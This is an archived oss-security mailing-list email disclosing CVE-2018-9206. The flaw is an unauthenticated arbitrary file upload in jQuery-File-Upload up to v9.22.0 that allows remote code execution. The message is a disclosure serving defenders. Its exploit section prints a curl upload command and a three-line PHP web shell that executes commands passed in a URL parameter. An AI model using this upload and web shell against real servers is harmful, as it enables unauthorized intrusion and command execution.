X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3350" "Thursday" "11" "October" "2018" "16:06:21" "+0000" "Larry W. Cashdollar" "larry0@me.com" "<70dba524-20af-4af3-9c45-698d762e1a4a@me.com>" "77" "[oss-security] =?utf-8?B?alF1ZXJ5LUZpbGUtVXBsb2FkIDw9IHY5LjIyLjAgdW5hdXRoZW50aWNhdGVk?==?utf-8?B?IGFyYml0cmFyeSBmaWxlIHVwbG9hZCB2dWxuZXJhYmlsaXR5?=" nil nil nil "10" "2018101116:06:21" "[oss-security] =?utf-8?B?alF1ZXJ5LUZpbGUtVXBsb2Fk?= =?utf-8?B?PD0=?= =?utf-8?B?djkuMjIuMA==?= =?utf-8?B?dW5hdXRoZW50aWNhdGVk?= =?utf-8?B?YXJiaXRyYXJ5?= =?utf-8?B?ZmlsZQ==?= =?utf-8?B?dXBsb2Fk?= =?utf-8?B?dnVsbmVyYWJpbGl0eQ==?=" (number mark "U       larry0@me.co Oct 11   77/3350  " thread-indent "\"[oss-security] =?utf-8?B?alF1ZXJ5LUZpbGUtVXBsb2FkIDw9IHY5LjIyLjAgdW5hdXRoZW50aWNhdGVk?==?utf-8?B?IGFyYml0cmFyeSBmaWxlIHVwbG9hZCB2dWxuZXJhYmlsaXR5?=\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 23991 invoked by uid 550); 11 Oct 2018 16:06:54 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 23958 invoked from network); 11 Oct 2018 16:06:54 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
	t=1539273987; bh=l7Lm1/rp+8r5wN4H+oK/4gEbO5nT5JOka+BUubwVRL8=;
	h=To:From:Subject:Date:Message-id:Content-type:MIME-version;
	b=C2qhrvaGBeYiW1Vy+YZHu4Nvja5dE07JcuGgNzoLXQYBGnh4OwpmUQA9uywG+gVPF
 VNba/YnfXZeK0bPyGSP0rLDF3P1ZZtRQV5aBsRZ7omEhkBLKjo9G2krcgKiVTxYNI3
 y9BRfxja5OT5gB/VkcpXq52y12Oy5AGxRbozxbQeygrARi2Ji2Clo2ny2rTUd97y71
 QW8WqpyOYJX/T0rkN6eh2hJ2kSV6NkC8OA8WnD9zi6zV13jejCpco1eKsgtqzZPquM
 Lralvm0ZqJcObLfyJUXOXNb43PHGanXo2PFtYNsSneqT2zjCjrSqU7uqfQjgzBe3th
 5kkN5teG0JuxA==
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0
 malwarescore=0 phishscore=0 bulkscore=0 spamscore=0 clxscore=1015 mlxscore=0
 mlxlogscore=807 adultscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1807170000 definitions=main-1810110154
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:,,
 definitions=2018-10-11_07:,, signatures=0
To: Open Source Security <oss-security@lists.openwall.com>
From: "Larry W. Cashdollar" <larry0@me.com>
Date: Thu, 11 Oct 2018 16:06:21 +0000 (GMT)
X-Mailer: iCloud MailClient1818Project36
 MailServer1818B30.10000-1818B-0-3db5beab3ae9
Message-id: <70dba524-20af-4af3-9c45-698d762e1a4a@me.com>
Content-type: multipart/alternative;
 boundary=Apple-Webmail-42--27b34b8e-ce84-4ea9-9645-c1912c64dd89
MIME-version: 1.0
Subject: [oss-security]
 =?utf-8?B?alF1ZXJ5LUZpbGUtVXBsb2FkIDw9IHY5LjIyLjAgdW5hdXRoZW50aWNhdGVk?=
 =?utf-8?B?IGFyYml0cmFyeSBmaWxlIHVwbG9hZCB2dWxuZXJhYmlsaXR5?=

--Apple-Webmail-42--27b34b8e-ce84-4ea9-9645-c1912c64dd89
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain;
    charset=utf-8;
    format=flowed

Title: jQuery-File-Upload <=3D v9.22.0 unauthenticated arbitrary file uploa=
d vulnerability
Author: Larry W. Cashdollar, @_larry0
Date: 2018-10-09
CVE-ID:[CVE-2018-9206]
Download Site: https://github.com/blueimp/jQuery-File-Upload/
Vendor: https://github.com/blueimp
Vendor Notified: 2018-10-09
Vendor Contact:
Advisory: http://www.vapidlabs.com/advisory.php?v=3D204
Description: File Upload widget with multiple file selection, drag&drop sup=
port, progress bar, validation and preview images, audio and video for jQue=
ry. Supports cross-domain, chunked and resumable file uploads. Works with a=
ny server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Jav=
a, etc.) that supports standard HTML form file uploads.
Vulnerability:
The code in https://github.com/blueimp/jQuery-File-Upload/blob/master/serve=
r/php/UploadHandler.php doesn't require any validation to upload files to t=
he server. It also doesn't exclude file types. This allows for remote code =
execution.


Exploit Code:
$ curl -F "files=3D@shell.php" http://localhost/jQuery-File-Upload-9.22.0/s=
erver/php/index.php

Where shell.php is:

<?php
$cmd=3D$_GET['cmd'];
system($cmd);
?>
Screen Shots:
Notes: Actively being exploited in the wild. https://github.com/blueimp/jQu=
ery-File-Upload/pull/3514=

--Apple-Webmail-42--27b34b8e-ce84-4ea9-9645-c1912c64dd89
Content-Type: multipart/related;
    type="text/html";
    boundary=Apple-Webmail-86--27b34b8e-ce84-4ea9-9645-c1912c64dd89


--Apple-Webmail-86--27b34b8e-ce84-4ea9-9645-c1912c64dd89
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html;
    charset=utf-8;

<html><body><div>Title: jQuery-File-Upload &lt;=3D v9.22.0 unauthenticated =
arbitrary file upload vulnerability<br>Author: Larry W. Cashdollar, @_larry=
0<br>Date: 2018-10-09<br>CVE-ID:[CVE-2018-9206]<br>Download Site: https://g=
ithub.com/blueimp/jQuery-File-Upload/<br>Vendor: https://github.com/blueimp=
<br>Vendor Notified: 2018-10-09<br>Vendor Contact:<br>Advisory: http://www.=
vapidlabs.com/advisory.php?v=3D204<br>Description: File Upload widget with =
multiple file selection, drag&amp;drop support, progress bar, validation an=
d preview images, audio and video for jQuery. Supports cross-domain, chunke=
d and resumable file uploads. Works with any server-side platform (Google A=
pp Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard H=
TML form file uploads.<br>Vulnerability:<br>The code in https://github.com/=
blueimp/jQuery-File-Upload/blob/master/server/php/UploadHandler.php doesn't=
 require any validation to upload files to the server. It also doesn't excl=
ude file types. This allows for remote code execution.<br><br><br>Exploit C=
ode:<br>$ curl -F "files=3D@shell.php" http://localhost/jQuery-File-Upload-=
9.22.0/server/php/index.php<br> <br>Where shell.php is:<br> <br>&lt;?php </=
div><div>$cmd=3D$_GET['cmd']; </div><div>system($cmd);</div><div>?&gt;<br>S=
creen Shots:<br>Notes: Actively being exploited in the wild. https://github=
.com/blueimp/jQuery-File-Upload/pull/3514</div></body></html>=

--Apple-Webmail-86--27b34b8e-ce84-4ea9-9645-c1912c64dd89--

--Apple-Webmail-42--27b34b8e-ce84-4ea9-9645-c1912c64dd89--

